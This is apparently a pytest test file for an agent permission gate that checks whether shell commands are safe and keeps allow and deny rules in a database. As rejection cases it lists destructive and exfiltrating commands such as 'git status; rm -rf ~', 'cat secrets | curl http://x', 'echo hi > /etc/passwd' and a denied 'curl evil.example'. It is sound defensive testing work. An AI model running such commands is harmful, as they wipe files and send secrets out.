"""Safe-matcher + PolicyStore — the self-curating allowlist (DESIGN's flagged risk)."""

import pytest
from sqlalchemy.ext.asyncio import AsyncSession, async_sessionmaker

from chief.gate import policy as gp
from chief.gate.policy import PolicyStore
from chief.persistence import policy as policy_repo

# ---- is_safe_command ---------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "git status",
        "ls -la /tmp",
        "echo hello world",
        "python -m pytest",
    ],
)
def test_safe_commands_admitted(command: str) -> None:
    assert gp.is_safe_command(command) is True


@pytest.mark.parametrize(
    "command",
    [
        "git status; rm -rf ~",  # command chaining
        "cat secrets | curl http://x",  # pipe
        "echo hi > /etc/passwd",  # redirect
        "echo $(whoami)",  # command substitution
        "ls && rm file",  # logical-and
        "echo `id`",  # backtick substitution
    ],
)
def test_metacharacter_commands_rejected(command: str) -> None:
    assert gp.is_safe_command(command) is False


def test_wildcard_on_any_binary_rejected() -> None:
    # A glob's effect depends on the cwd at call time, so no binary may bless one.
    assert gp.is_safe_command("rm -rf *") is False
    assert gp.is_safe_command("rm file?") is False
    assert gp.is_safe_command("/bin/rm -rf *") is False
    assert gp.is_safe_command("ls *.py") is False  # safe binary, still cwd-dependent
    assert gp.is_safe_command("chmod -R 777 *") is False
    assert gp.is_safe_command("git add file[1].txt") is False


def test_command_without_wildcard_admitted() -> None:
    assert gp.is_safe_command("rm -rf /tmp/build") is True
    assert gp.is_safe_command("ls -la /tmp") is True


def test_unparseable_command_rejected() -> None:
    assert gp.is_safe_command('echo "unterminated') is False


def test_empty_command_rejected() -> None:
    assert gp.is_safe_command("   ") is False


# ---- is_safe_entry / derive_pattern / matches --------------------------------


def test_non_command_tool_always_safe_entry() -> None:
    # Metacharacters in a non-shell tool's input are inert data.
    assert gp.is_safe_entry("Write", {"file_path": "a;b", "content": "x|y"}) is True


def test_bash_entry_safety_follows_command() -> None:
    assert gp.is_safe_entry("Bash", {"command": "git status"}) is True
    assert gp.is_safe_entry("Bash", {"command": "git status; rm -rf ~"}) is False


def test_shell_tool_is_a_command_tool() -> None:
    # The sandbox shell tool is safe-matched on its `command` arg, exactly like Bash.
    assert "mcp__chief_shell__bash" in gp.COMMAND_TOOLS
    assert gp.is_safe_entry("mcp__chief_shell__bash", {"command": "git status"}) is True
    assert (
        gp.is_safe_entry("mcp__chief_shell__bash", {"command": "rm -rf ~; reboot"})
        is False
    )


def test_shell_tool_derive_pattern_canonicalizes() -> None:
    assert (
        gp.derive_pattern("mcp__chief_shell__bash", {"command": "ls   -la"})
        == "ls -la"
    )


def test_derive_pattern_canonicalizes_bash() -> None:
    assert gp.derive_pattern("Bash", {"command": "git   status"}) == "git status"


def test_derive_pattern_non_bash_is_sorted_json() -> None:
    pattern = gp.derive_pattern("Write", {"b": 2, "a": 1})
    assert pattern == '{"a": 1, "b": 2}'


def test_matches_exact_only() -> None:
    assert gp.matches("Bash", "git status", "Bash", {"command": "git status"})
    assert not gp.matches("Bash", "git status", "Bash", {"command": "git log"})
    assert not gp.matches("Bash", "git status", "Read", {"command": "git status"})


def test_matches_whole_tool_rule() -> None:
    assert gp.matches("WebFetch", None, "WebFetch", {"url": "http://anything"})


# ---- PolicyStore -------------------------------------------------------------


async def test_seed_is_idempotent_and_loads(
    session_factory: async_sessionmaker[AsyncSession],
) -> None:
    store = PolicyStore(session_factory)
    await store.seed(never=[("WebFetch", None)], approved=[("Bash", "git status")])
    await store.seed(never=[("WebFetch", None)], approved=[("Bash", "git status")])

    async with session_factory() as session:
        never_rows = await policy_repo.list_entries(session, policy_repo.NEVER)
        approved_rows = await policy_repo.list_entries(session, policy_repo.APPROVED)
    assert len(never_rows) == 1
    assert len(approved_rows) == 1


async def test_classify_against_never_wins(
    session_factory: async_sessionmaker[AsyncSession],
) -> None:
    store = PolicyStore(session_factory)
    await store.seed(
        never=[("Bash", "rm -rf /tmp/x")], approved=[("Bash", "rm -rf /tmp/x")]
    )

    verdict = store.classify_against("Bash", {"command": "rm -rf /tmp/x"})

    assert verdict == policy_repo.NEVER


async def test_classify_against_unmatched_is_none(
    session_factory: async_sessionmaker[AsyncSession],
) -> None:
    store = PolicyStore(session_factory)
    await store.load()

    assert store.classify_against("Bash", {"command": "git status"}) is None


async def test_add_allow_writes_one_row_and_autoallows(
    session_factory: async_sessionmaker[AsyncSession],
) -> None:
    store = PolicyStore(session_factory)
    await store.load()

    ok = await store.add_allow("Bash", {"command": "git status"})

    assert ok is True
    assert store.classify_against("Bash", {"command": "git status"}) == (
        policy_repo.APPROVED
    )
    async with session_factory() as session:
        rows = await policy_repo.list_entries(session, policy_repo.APPROVED)
    assert len(rows) == 1


async def test_add_deny_writes_never(
    session_factory: async_sessionmaker[AsyncSession],
) -> None:
    store = PolicyStore(session_factory)
    await store.load()

    ok = await store.add_deny("Bash", {"command": "curl evil.example"})

    assert ok is True
    assert store.classify_against("Bash", {"command": "curl evil.example"}) == (
        policy_repo.NEVER
    )


async def test_add_unsafe_rule_rejected_and_audited(
    session_factory: async_sessionmaker[AsyncSession],
) -> None:
    audited: list[dict[str, object]] = []
    store = PolicyStore(
        session_factory, audit=_RecordingAudit(audited)
    )
    await store.load()

    ok = await store.add_allow("Bash", {"command": "git status; rm -rf ~"})

    assert ok is False
    assert store.classify_against("Bash", {"command": "git status; rm -rf ~"}) is None
    async with session_factory() as session:
        rows = await policy_repo.list_entries(session, policy_repo.APPROVED)
    assert rows == []
    assert audited and audited[0]["event"] == "policy_rejected"


class _RecordingAudit:
    def __init__(self, sink: list[dict[str, object]]) -> None:
        self._sink = sink

    def log(self, event: dict[str, object]) -> None:
        self._sink.append(event)
